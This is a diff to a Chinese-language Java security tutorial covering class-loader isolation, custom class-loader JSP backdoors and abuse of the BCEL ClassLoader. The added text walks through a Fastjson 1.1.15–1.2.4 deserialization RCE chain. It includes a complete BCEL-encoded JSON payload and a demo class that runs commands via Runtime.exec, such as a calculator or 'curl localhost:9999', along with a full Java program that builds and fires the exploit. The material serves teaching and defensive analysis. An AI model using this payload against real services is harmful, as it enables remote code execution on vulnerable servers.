@@ -271,6 +271,113 @@ pom.xml
 
 
 
+## 类加载隔离
+
+创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两则必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。
+
+<img src="../../images/image-20211025171150475.png" alt="image-20211025171150475" style="zoom:50%;" />
+
+
+
+### 跨类加载器加载
+
+RASP和IAST经过会用到跨类加载器加载类的情况，因为RASP/IAST会在任意可能存在安全风险的类中插入检测代码，因此必须得保证RASP/IAST的类能够被插入的类所使用的类加载正确加载，否则就会出现ClassNotFoundException，除此之外，跨类加载器调用类方法时需要特别注意一个基本原则：`ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射`。
+
+**示例 - 跨类加载器加载：**
+
+```java
+package com.anbai.sec.classloader;
+
+import java.lang.reflect.Method;
+
+import static com.anbai.sec.classloader.TestClassLoader.TEST_CLASS_BYTES;
+import static com.anbai.sec.classloader.TestClassLoader.TEST_CLASS_NAME;
+
+public class TestCrossClassLoader {
+
+   public static class ClassLoaderA extends ClassLoader {
+
+      public ClassLoaderA(ClassLoader parent) {
+         super(parent);
+      }
+
+      {
+         // 加载类字节码
+         defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
+      }
+
+   }
+
+   public static class ClassLoaderB extends ClassLoader {
+
+      public ClassLoaderB(ClassLoader parent) {
+         super(parent);
+      }
+
+      {
+         // 加载类字节码
+         defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
+      }
+
+   }
+
+   public static void main(String[] args) throws Exception {
+      // 父类加载器
+      ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();
+
+      // A类加载器
+      ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);
+
+      // B类加载器
+      ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);
+
+      // 使用A/B类加载器加载同一个类
+      Class<?> aClass  = Class.forName(TEST_CLASS_NAME, true, aClassLoader);
+      Class<?> aaClass = Class.forName(TEST_CLASS_NAME, true, aClassLoader);
+      Class<?> bClass  = Class.forName(TEST_CLASS_NAME, true, bClassLoader);
+
+      // 比较A类加载和B类加载器加载的类是否相等
+      System.out.println("aClass == aaClass：" + (aClass == aaClass));
+      System.out.println("aClass == bClass：" + (aClass == bClass));
+
+      System.out.println("\n" + aClass.getName() + "方法清单：");
+
+      // 获取该类所有方法
+      Method[] methods = aClass.getDeclaredMethods();
+
+      for (Method method : methods) {
+         System.out.println(method);
+      }
+
+      // 创建类实例
+      Object instanceA = aClass.newInstance();
+
+      // 获取hello方法
+      Method helloMethod = aClass.getMethod("hello");
+
+      // 调用hello方法
+      String result = (String) helloMethod.invoke(instanceA);
+
+      System.out.println("\n反射调用：" + TEST_CLASS_NAME + "类" + helloMethod.getName() + "方法，返回结果：" + result);
+   }
+
+}
+```
+
+程序执行后输出如下结果：
+
+```java
+aClass == aaClass：true
+aClass == bClass：false
+
+com.anbai.sec.classloader.TestHelloWorld方法清单：
+public java.lang.String com.anbai.sec.classloader.TestHelloWorld.hello()
+
+反射调用：com.anbai.sec.classloader.TestHelloWorld类hello方法，返回结果：Hello World~
+```
+
+
+
 ## JSP自定义类加载后门
 
 以`冰蝎`为首的JSP后门利用的就是自定义类加载实现的，冰蝎的客户端会将待执行的命令或代码片段通过动态编译成类字节码并加密后传到冰蝎的JSP后门，后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的`equals`方法实现恶意攻击，其中`equals`方法传入的`pageContext`对象是为了便于获取到请求和响应对象，需要注意的是冰蝎的命令执行等参数不会从请求中获取，而是直接插入到了类成员变量中。
@@ -306,13 +413,17 @@ pom.xml
 
 ## BCEL ClassLoader
 
-[BCEL](https://commons.apache.org/proper/commons-bcel/)（`Apache Commons BCEL™`）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名`org.apache.bcel.util.ClassLoader`为`com.sun.org.apache.bcel.internal.util.ClassLoader`，BCEL的类加载器在解析类名时会对ClassName中有`$$BCEL$$`标识的类做特殊处理，该特性经常被用于编写各类Payload。
+[BCEL](https://commons.apache.org/proper/commons-bcel/)（`Apache Commons BCEL™`）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名`org.apache.bcel.util.ClassLoader`为`com.sun.org.apache.bcel.internal.util.ClassLoader`，BCEL的类加载器在解析类名时会对ClassName中有`$$BCEL$$`标识的类做特殊处理，该特性经常被用于编写各类攻击Payload。
+
+
+
+### BCEL攻击原理
+
+当BCEL的`com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass`加载一个类名中带有`$$BCEL$$`的类时会截取出`$$BCEL$$`后面的字符串，然后使用`com.sun.org.apache.bcel.internal.classfile.Utility#decode`将字符串解析成类字节码（带有攻击代码的恶意类），最后会调用`defineClass`注册解码后的类，一旦该类被加载就会触发类中的恶意代码，正是因为BCEL有了这个特性，才得以被广泛的应用于各类攻击Payload中。
 
 **示例 - BCEL类名解码：**
 
 <img src="../../images/image-20211021104833683.png" alt="image-20211021104833683" style="zoom:50%;" />
-
-当BCEL的`com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass`加载一个类名中带有`$$BCEL$$`的类时会截取出`$$BCEL$$`后面的字符串，然后使用`com.sun.org.apache.bcel.internal.classfile.Utility#decode`将字符串解析成类字节码，最后会调用`defineClass`注册解码后的类，一旦该类被加载就会触发类中的恶意代码，正是因为BCEL有了这个特性，才得以被广泛的应用于各类攻击Payload中。
 
 
 
@@ -343,77 +454,6 @@ byte[] bytes = com.sun.org.apache.bcel.internal.classfile.Utility.decode(realNam
 
 
 
-**示例 - 使用BCEL实现命令执行：**
-
-```java
-package com.anbai.sec.classloader;
-
-import com.sun.org.apache.bcel.internal.classfile.Utility;
-
-public class BCELClassLoader {
-
-	/**
-	 * com.anbai.sec.classloader.TestBCELClass类字节码，Windows和MacOS弹计算器，Linux执行curl localhost:9999
-	 * <pre>
-	 * package com.anbai.sec.classloader;
-	 *
-	 * import java.io.IOException;
-	 *
-	 * public class TestBCELClass {
-	 *
-	 * 	static {
-	 * 		String command = "open -a Calculator.app";
-	 * 		String osName  = System.getProperty("os.name");
-	 *
-	 * 		if (osName.startsWith("Windows")) {
-	 * 			command = "calc 12345678901234567";
-	 *      } else if (osName.startsWith("Linux")) {
-	 * 			command = "curl localhost:9999/";
-	 *       }
-	 *
-	 * 		try {
-	 * 			Runtime.getRuntime().exec(command);
-	 *      } catch (IOException e) {
-	 * 			e.printStackTrace();
-	 *      }
-	 *   }
-	 * }
-	 * </pre>
-	 */
-	private static final byte[] CLASS_BYTES = new byte[]{
-			-54, -2, -70, -66, 0, 0, 0, 50 // .... 因字节码过长此处省略，完整代码请参考：https://github.com/javaweb-sec/javaweb-sec/blob/master/javaweb-sec-source/javase/src/main/java/com/anbai/sec/classloader/BCELClassLoader.java
-	};
-
-	public static void main(String[] args) {
-		try {
-			// 使用反射是为了防止高版本JDK不存在com.sun.org.apache.bcel.internal.util.ClassLoader类
-			Class<?> bcelClass = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
-
-			// 创建BCEL类加载器
-//			ClassLoader classLoader = (ClassLoader) bcelClass.newInstance();
-//			ClassLoader classLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader();
-			ClassLoader classLoader = new org.apache.bcel.util.ClassLoader();
-
-			// BCEL编码类字节码
-			String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);
-
-			System.out.println(className);
-
-			Class<?> clazz = Class.forName(className, true, classLoader);
-
-			System.out.println(clazz);
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
-	}
-
-}
-```
-
-上述示例程序利用了BCEL的类加载特性加载了一个恶意的类：`com.anbai.sec.classloader.TestBCELClass`，该类的static语句块中包含了命令执行，所以该类一旦被初始化就会触发命令执行。
-
-
-
 ### BCEL兼容性问题
 
 BCEL这个特性仅适用于BCEL 6.0以下，因为从6.0开始`org.apache.bcel.classfile.ConstantUtf8#setBytes`就已经过时了，如下：
@@ -430,6 +470,163 @@ public final void setBytes( final String bytes ) {
 ```
 
 Oracle自带的BCEL是修改了原始的包名，因此也有兼容性问题，已知支持该特性的JDK版本为：`JDK1.5 - 1.7`、`JDK8 - JDK8u241`、`JDK9`。
+
+
+
+### BCEL FastJson攻击链分析
+
+Fastjson（1.1.15 - 1.2.4）可以使用其中有个dbcp的Payload就是利用了BCEL攻击链，利用代码如下：
+
+```json
+{"@type":"org.apache.commons.dbcp.BasicDataSource","driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85R$5bO$TA$U$fe$a6$z$dde$bbXX$$$e2$F$z$8aPJ$e9r$x$X$r$3e$d8$60$a2$U1$b6$b1$89o$d3$e9$a4$ynw$9b$dd$a9$c2$l1$f1$X$f0$cc$L$S$l$fc$B$fe$p$l4$9e$5d$h$U$rqvsf$ce7$e7$7c$e7$9b$99$f3$f5$c7$e7$_$AV$b0i$m$8b$9b$3an$e9$b8m$60$Kwt$dc5$90$c3$b4$8e$7b$3a$ee$eb$981$f0$A$b3$91$99$d3$907$60b$5eCA$c3$CCz$db$f1$i$f5$98$n$99$9f$7f$cd$90$aa$f8$z$c9$90$ad$3a$9e$7c$d1$eb4eP$e7M$97$Q$7d$5b$b8$fd$c8$a1$9a$e2$e2$ed$k$ef$c6$5b$g$8a$c4$c9$60$d4$fc$5e$m$e4S$t$8a$b6$ea2TO$w$3b$d5$8a$cb$c3$b0t$c8$dfq$T$c3$Ya$98$f0$bb$d2$cb$z$f2$5c$85$bb$a2$e7r$e5$H$r$de$ed2h$7eX$f2x$87$f8$WM$94$60$T$d2p$bc$96$ff$3e$a4$K$s$96$b0L$c9$82$92r$cb$x$abk$e5$f5$8d$cd$ad$a5$fe$8aa$80$f4$f6$8e$Y$c6D$_ps$aeOq$H$7e$a8$kn$d1$b05$ac$98X$c5$9a$892$d6$ZF$p5$b6$e3$db$cf$f6w$8e$84$ec$w$c7$f7LlD$e2$e6$84$df$b1$b9$d7$e4$8e$jJa$8bH$bc$eb$f3$96$M$ecK$Hb$Y$8eI$5c$ee$b5$ed$fd$e6$a1$U$ea$STS$81$e3$b5$_C$c7$a1$92$j$86L$5b$aa$97$B$5dB$a0$8e$Zf$f3$d5$bf$b3$k$cd$ff$L$d1$ed$86$8a$H$wl8$ea$80a$fc$aa$ac7$M$p$bf$d1W$3dO9$jz$J$83$ea$5d8$e3$f9$3f$c9$fb0$b1$a7$e4$91$Ut$fc$ff$a8$n$ddB$86$n$rd$bb$b4$a9$e2$3e$a8$H$5cHL$e3$g$f5$604$S$60$d1K$93$b5$c8$9b$a2$99$d1$3cP$f8$EvJ$L$ba$7f$b2$e9_$mt$8c$5d$84$7e$a0$d4$q$cde$x$b1k$r$cf$91$aa$$X$DgH$7f$c4$a0$a5$ed$9e$m$bb$60$e9$b1$9b$b6$Gw$cfa$U$ce$90i$9c$40$df$x$9ea$e8$94HfP$84M$bd$9d$88K$94$90$n$ab$T$e5$m$7d$Z$wab$SC$b1$d2$Z$f2$8a$Y$a7$e8Qj$ac1$aca$82$3c$90$97$fa$8eI$N$T$f4g$9ek$b8$fe$N$v$o$9e$8c$8fu$e3$t$b2$b7e$b6p$D$A$A","driverClassLoader":{"@type":"org.apache.bcel.util.ClassLoader"}}
+```
+
+FastJson自动调用setter方法修改`org.apache.commons.dbcp.BasicDataSource`类的`driverClassName`和`driverClassLoader`值，`driverClassName`是经过BCEL编码后的`com.anbai.sec.classloader.TestBCELClass`类字节码，`driverClassLoader`是一个由FastJson创建的`org.apache.bcel.util.ClassLoader`实例。
+
+**示例 - com.anbai.sec.classloader.TestBCELClass类：**
+
+```java
+package com.anbai.sec.classloader;
+
+import java.io.IOException;
+
+public class TestBCELClass {
+
+	static {
+		String command = "open -a Calculator.app";
+		String osName  = System.getProperty("os.name");
+
+		if (osName.startsWith("Windows")) {
+			command = "calc 12345678901234567";
+		} else if (osName.startsWith("Linux")) {
+			command = "curl localhost:9999/";
+		}
+
+		try {
+			Runtime.getRuntime().exec(command);
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+	}
+
+}
+```
+
+使用BCEL编码com.anbai.sec.classloader.TestBCELClass类字节码：
+
+```java
+/**
+* 将一个Class文件编码成BCEL类
+*
+* @param classFile Class文件路径
+* @return 编码后的BCEL类
+* @throws IOException 文件读取异常
+*/
+public static String bcelEncode(File classFile) throws IOException {
+	return "$$BCEL$$" + Utility.encode(FileUtils.readFileToByteArray(classFile), true);
+}
+```
+
+从JSON反序列化实现来看，只是注入了类名和类加载器并不足以触发类加载，导致命令执行的关键问题就在于FastJson会自动调用getter方法，`org.apache.commons.dbcp.BasicDataSource`本没有`connection`成员变量，但有一个`getConnection()`方法，按理来讲应该不会调用`getConnection()`方法，但是FastJson会通过`getConnection()`这个方法名计算出一个名为`connection`的field，详情参见：[com.alibaba.fastjson.util.TypeUtils#computeGetters](https://github.com/alibaba/fastjson/blob/869746101f6dd73b70d8a9c2b6dc59de4352519e/src/main/java/com/alibaba/fastjson/util/TypeUtils.java#L1904)，因此FastJson最终还是调用了`getConnection()`方法。
+
+当`getConnection()`方法被调用时就会使用注入进来的`org.apache.bcel.util.ClassLoader`类加载器加载注入进来恶意类字节码，如下图：
+
+<img src="../../images/image-20211025163659065.png" alt="image-20211025163659065" style="zoom:50%;" />
+
+因为使用了反射的方式加载`com.anbai.sec.classloader.TestBCELClass`类，而且还特意指定了需要初始化类（`Class.forName(driverClassName, true, driverClassLoader);`），因此该类的静态语句块（`static{...}`）将会被执行，完整的攻击示例代码如下：
+
+```java
+package com.anbai.sec.classloader;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+import org.apache.commons.dbcp.BasicDataSource;
+import org.javaweb.utils.FileUtils;
+
+import java.io.File;
+import java.io.IOException;
+import java.util.LinkedHashMap;
+import java.util.Map;
+
+public class BCELClassLoader {
+
+	/**
+	 * com.anbai.sec.classloader.TestBCELClass类字节码，Windows和MacOS弹计算器，Linux执行curl localhost:9999
+	 * </pre>
+	 */
+	private static final byte[] CLASS_BYTES = new byte[]{
+			-54, -2, -70, -66, 0, 0, 0, 50, 0, // .... 因字节码过长此处省略，完整代码请参考：https://github.com/javaweb-sec/javaweb-sec/blob/master/javaweb-sec-source/javase/src/main/java/com/anbai/sec/classloader/BCELClassLoader.java
+	};
+
+  /**
+	 * 将一个Class文件编码成BCEL类
+	 *
+	 * @param classFile Class文件路径
+	 * @return 编码后的BCEL类
+	 * @throws IOException 文件读取异常
+	 */
+	public static String bcelEncode(File classFile) throws IOException {
+		return "$$BCEL$$" + Utility.encode(FileUtils.readFileToByteArray(classFile), true);
+	}
+  
+	/**
+	 * BCEL命令执行示例，测试时请注意兼容性问题：① 适用于BCEL 6.0以下。② JDK版本为：JDK1.5 - 1.7、JDK8 - JDK8u241、JDK9
+	 *
+	 * @throws Exception 类加载异常
+	 */
+	public static void bcelTest() throws Exception {
+		// 使用反射是为了防止高版本JDK不存在com.sun.org.apache.bcel.internal.util.ClassLoader类
+//		Class<?> bcelClass = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
+
+		// 创建BCEL类加载器
+//			ClassLoader classLoader = (ClassLoader) bcelClass.newInstance();
+//			ClassLoader classLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader();
+		ClassLoader classLoader = new org.apache.bcel.util.ClassLoader();
+
+		// BCEL编码类字节码
+		String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);
+
+		System.out.println(className);
+
+		Class<?> clazz = Class.forName(className, true, classLoader);
+
+		System.out.println(clazz);
+	}
+
+	/**
+	 * Fastjson 1.1.15 - 1.2.4 反序列化RCE示例，示例程序考虑到测试环境的兼容性，采用的都是Apache commons dbcp和bcel
+	 *
+	 * @throws IOException BCEL编码异常
+	 */
+	public static void fastjsonRCE() throws IOException {
+		// BCEL编码类字节码
+		String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);
+
+		// 构建恶意的JSON
+		Map<String, Object> dataMap        = new LinkedHashMap<String, Object>();
+		Map<String, Object> classLoaderMap = new LinkedHashMap<String, Object>();
+
+		dataMap.put("@type", BasicDataSource.class.getName());
+		dataMap.put("driverClassName", className);
+
+		classLoaderMap.put("@type", org.apache.bcel.util.ClassLoader.class.getName());
+		dataMap.put("driverClassLoader", classLoaderMap);
+
+		String json = JSON.toJSONString(dataMap);
+		System.out.println(json);
+
+		JSONObject jsonObject = JSON.parseObject(json);
+		System.out.println(jsonObject);
+	}
+
+	public static void main(String[] args) throws Exception {
+//		bcelTest();
+		fastjsonRCE();
+	}
+
+}
+```
 
 
 
